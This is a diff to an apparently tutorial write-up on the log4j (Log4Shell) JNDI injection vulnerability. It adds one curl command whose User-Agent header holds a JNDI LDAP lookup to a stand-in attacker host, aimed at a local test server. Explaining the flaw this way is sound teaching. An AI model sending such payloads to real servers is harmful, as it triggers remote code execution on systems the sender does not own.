@@ -26,3 +26,4 @@ Making the server run it:
 Now we can get a little better look at what's to come. If in our request, we use the **JNDI** (Java Naming and Directory Interface) protocol, it becomes possible to execute some malicious payload inside the server, thus triggering the log4j vulnerability, which, after execution, makes the server returns us a Java classpath, which was injected earlier.
 
 This injected payload when triggered, gives the attacker access to execute arbitrary code. 
+	curl -v -H 'User-Agent: ${jndi:ldap//:attacker.server.com/payload}' '172.17.0.1:8080/'
